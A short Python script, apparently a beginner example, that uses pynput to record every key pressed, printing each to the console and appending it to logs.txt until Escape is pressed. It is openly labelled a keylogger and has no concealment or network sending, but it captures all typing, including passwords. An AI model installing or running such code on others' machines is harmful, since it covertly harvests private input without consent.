'''
A simple key logger, print the key to the stdio and output the key strokes in logs.txt

'''
from pynput.keyboard import Key, Listener

def on_press(key):
    print('{0} pressed'.format(
            key), end = "")
    f = open("logs.txt", "a")
    f.write('{0}'.format(key))
    f.write('\n')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False
    print('{0} release'.format(
        key))

# Collect events until released
with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()